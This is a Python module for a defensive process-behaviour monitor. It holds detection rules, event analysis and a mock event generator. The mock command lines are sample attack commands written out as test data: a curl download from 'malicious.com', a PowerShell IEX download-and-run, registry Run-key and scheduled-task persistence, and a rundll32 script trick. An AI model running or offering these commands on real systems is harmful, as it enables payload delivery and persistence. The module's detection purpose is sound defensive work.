"""
Behavioral Watcher - Runtime Process Behavior Analysis

Monitors process behaviors and detects anomalous activities
that may indicate malicious intent.
"""

import logging
import uuid
import random
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta
from utils.common import get_timestamp

logger = logging.getLogger(__name__)


class BehaviorWatcher:
    """
    Monitor and analyze runtime process behaviors.
    
    Detects suspicious activities including:
    - Process injection attempts
    - Unusual child processes
    - Registry modifications
    - Network anomalies
    - File system manipulation
    - Encoded command execution
    """
    
    def __init__(self):
        """Initialize the behavior watcher."""
        self.events = []  # Event storage
        self.rules = self._initialize_rules()
        self.max_events = 1000  # Ring buffer size
        logger.info("BehaviorWatcher initialized")
    
    def _initialize_rules(self) -> List[Dict]:
        """
        Initialize behavioral detection rules.
        
        Returns:
            List of rule definitions
        """
        return [
            {
                'rule_id': 'BR-001',
                'name': 'Encoded Command Execution',
                'description': 'PowerShell or cmd executing encoded commands',
                'indicators': ['powershell.exe', 'cmd.exe'],
                'behaviors': ['encoded_command_executed', 'base64_detected'],
                'severity': 'high'
            },
            {
                'rule_id': 'BR-002',
                'name': 'Child Process from Temp',
                'description': 'Process spawned from temporary directory',
                'indicators': ['temp', 'tmp', 'downloads'],
                'behaviors': ['child_from_temp_folder', 'unusual_parent'],
                'severity': 'medium'
            },
            {
                'rule_id': 'BR-003',
                'name': 'Registry Modification',
                'description': 'Unauthorized registry changes',
                'indicators': ['reg.exe', 'regedit.exe'],
                'behaviors': ['registry_modification', 'autorun_created'],
                'severity': 'high'
            },
            {
                'rule_id': 'BR-004',
                'name': 'Process Injection',
                'description': 'Potential process injection detected',
                'indicators': ['CreateRemoteThread', 'WriteProcessMemory'],
                'behaviors': ['process_injection', 'memory_manipulation'],
                'severity': 'high'
            },
            {
                'rule_id': 'BR-005',
                'name': 'Network Anomaly',
                'description': 'Unusual network activity',
                'indicators': ['outbound', 'connection'],
                'behaviors': ['outbound_conn_unusual', 'c2_communication'],
                'severity': 'medium'
            }
        ]
    
    def get_events(self, limit: int = 50, severity: Optional[str] = None) -> List[Dict]:
        """
        Get recent behavioral events.
        
        Args:
            limit: Maximum number of events to return
            severity: Optional severity filter (low, medium, high)
        
        Returns:
            List of behavioral events
        """
        filtered = self.events
        
        if severity:
            filtered = [e for e in filtered if e['severity'] == severity]
        
        # Return most recent events
        return sorted(filtered, key=lambda x: x['timestamp'], reverse=True)[:limit]
    
    def generate_mock_event(self) -> Dict[str, Any]:
        """
        Generate a mock behavioral event for testing.
        In production, this would come from actual host agents.
        
        Returns:
            Behavioral event dictionary
        """
        processes = [
            'powershell.exe',
            'cmd.exe', 
            'rundll32.exe',
            'regsvr32.exe',
            'mshta.exe',
            'wscript.exe'
        ]
        
        hosts = [
            'WIN-SRV-01',
            'WIN-WKS-05',
            'WIN-WKS-12',
            'WIN-WKS-23',
            'WIN-SRV-02'
        ]
        
        behavior_patterns = [
            ['encoded_command_executed', 'base64_detected'],
            ['child_from_temp_folder', 'unusual_parent'],
            ['registry_modification', 'autorun_created'],
            ['process_injection', 'memory_manipulation'],
            ['outbound_conn_unusual', 'c2_communication'],
            ['file_created_startup', 'persistence_mechanism']
        ]
        
        severities = ['low', 'medium', 'high']
        confidences = ['low', 'medium', 'high']
        
        process = random.choice(processes)
        behaviors = random.choice(behavior_patterns)
        severity = random.choice(severities)
        
        # High severity more likely for certain behaviors
        if 'injection' in str(behaviors) or 'encoded' in str(behaviors):
            severity = 'high'
        
        event = {
            'event_id': f"beh-{uuid.uuid4().hex[:8]}",
            'type': 'behavior_alert',
            'host': random.choice(hosts),
            'process': process,
            'pid': random.randint(1000, 9999),
            'parent': random.choice(['explorer.exe', 'services.exe', 'svchost.exe']),
            'behavior': behaviors,
            'severity': severity,
            'confidence': random.choice(confidences),
            'timestamp': get_timestamp(),
            'details': {
                'command_line': self._generate_mock_cmdline(process),
                'user': 'SYSTEM' if random.random() > 0.7 else 'Administrator'
            }
        }
        
        return event
    
    def _generate_mock_cmdline(self, process: str) -> str:
        """Generate mock command line for a process."""
        cmdlines = {
            'powershell.exe': [
                'powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A...',
                'powershell.exe -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(...)"',
                'powershell.exe -ExecutionPolicy Bypass -File malicious.ps1'
            ],
            'cmd.exe': [
                'cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater',
                'cmd.exe /c schtasks /create /tn "SystemUpdate" /tr C:\\temp\\update.exe',
                'cmd.exe /c curl http://malicious.com/payload.exe -o C:\\temp\\update.exe'
            ],
            'rundll32.exe': [
                'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";...',
                'rundll32.exe C:\\Users\\Public\\malicious.dll,EntryPoint'
            ]
        }
        
        if process in cmdlines:
            return random.choice(cmdlines[process])
        
        return f'{process} <args>'
    
    def add_event(self, event: Dict[str, Any]) -> Dict[str, Any]:
        """
        Add a behavioral event to the stream.
        
        Args:
            event: Event dictionary
        
        Returns:
            Confirmation
        """
        # Add timestamp if not present
        if 'timestamp' not in event:
            event['timestamp'] = get_timestamp()
        
        # Add event_id if not present
        if 'event_id' not in event:
            event['event_id'] = f"beh-{uuid.uuid4().hex[:8]}"
        
        # Add to events (ring buffer)
        self.events.append(event)
        
        # Maintain max size
        if len(self.events) > self.max_events:
            self.events = self.events[-self.max_events:]
        
        logger.info(f"Behavioral event added: {event['event_id']} - {event.get('process', 'unknown')}")
        
        return {
            'status': 'success',
            'event_id': event['event_id']
        }
    
    def analyze_behavior(self, host: str, pid: int) -> Dict[str, Any]:
        """
        Analyze behavior for a specific process.
        
        Args:
            host: Host identifier
            pid: Process ID
        
        Returns:
            Analysis results
        """
        # Find events for this process
        process_events = [
            e for e in self.events 
            if e.get('host') == host and e.get('pid') == pid
        ]
        
        if not process_events:
            return {
                'status': 'not_found',
                'message': f'No events found for {host}:{pid}'
            }
        
        # Aggregate behaviors
        all_behaviors = []
        for event in process_events:
            all_behaviors.extend(event.get('behavior', []))
        
        # Get unique behaviors
        unique_behaviors = list(set(all_behaviors))
        
        # Determine overall severity
        severities = [e.get('severity', 'low') for e in process_events]
        severity_map = {'high': 3, 'medium': 2, 'low': 1}
        max_severity_num = max(severity_map.get(s, 1) for s in severities)
        overall_severity = {3: 'high', 2: 'medium', 1: 'low'}[max_severity_num]
        
        # Match against rules
        matched_rules = []
        for rule in self.rules:
            rule_behaviors = rule['behaviors']
            if any(b in unique_behaviors for b in rule_behaviors):
                matched_rules.append({
                    'rule_id': rule['rule_id'],
                    'name': rule['name'],
                    'severity': rule['severity']
                })
        
        return {
            'host': host,
            'pid': pid,
            'event_count': len(process_events),
            'behaviors': unique_behaviors,
            'overall_severity': overall_severity,
            'matched_rules': matched_rules,
            'recommendation': self._get_recommendation(overall_severity, matched_rules)
        }
    
    def _get_recommendation(self, severity: str, matched_rules: List[Dict]) -> str:
        """Get action recommendation based on analysis."""
        if severity == 'high' and len(matched_rules) >= 2:
            return 'IMMEDIATE ACTION REQUIRED: Isolate host and terminate process'
        elif severity == 'high':
            return 'Terminate process and collect evidence'
        elif severity == 'medium':
            return 'Monitor closely and prepare containment'
        else:
            return 'Continue monitoring'
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get behavioral monitoring statistics.
        
        Returns:
            Statistics dictionary
        """
        total_events = len(self.events)
        
        if total_events == 0:
            return {
                'total_events': 0,
                'by_severity': {'low': 0, 'medium': 0, 'high': 0},
                'unique_hosts': 0,
                'unique_processes': 0
            }
        
        # Count by severity
        by_severity = {
            'low': sum(1 for e in self.events if e.get('severity') == 'low'),
            'medium': sum(1 for e in self.events if e.get('severity') == 'medium'),
            'high': sum(1 for e in self.events if e.get('severity') == 'high')
        }
        
        # Unique hosts and processes
        unique_hosts = len(set(e.get('host', '') for e in self.events))
        unique_processes = len(set(e.get('process', '') for e in self.events))
        
        # Recent activity (last hour)
        one_hour_ago = datetime.now() - timedelta(hours=1)
        recent_events = [
            e for e in self.events 
            if datetime.fromisoformat(e['timestamp'].replace('Z', '+00:00')) > one_hour_ago
        ]
        
        return {
            'total_events': total_events,
            'by_severity': by_severity,
            'unique_hosts': unique_hosts,
            'unique_processes': unique_processes,
            'recent_activity': len(recent_events),
            'rules_loaded': len(self.rules)
        }
    
    def clear_events(self) -> Dict[str, Any]:
        """Clear all events (for testing)."""
        count = len(self.events)
        self.events = []
        logger.info(f"Cleared {count} behavioral events")
        
        return {
            'status': 'success',
            'cleared': count
        }
    
    def get_rules(self) -> List[Dict]:
        """Get all behavioral detection rules."""
        return self.rules
    
    def start_monitoring_simulation(self, event_count: int = 10) -> Dict[str, Any]:
        """
        Start a simulation that generates mock events.
        Useful for testing and demonstrations.
        
        Args:
            event_count: Number of events to generate
        
        Returns:
            Summary of generated events
        """
        generated = []
        
        for _ in range(event_count):
            event = self.generate_mock_event()
            self.add_event(event)
            generated.append(event['event_id'])
        
        logger.info(f"Generated {event_count} mock behavioral events")
        
        return {
            'status': 'success',
            'generated': event_count,
            'event_ids': generated
        }
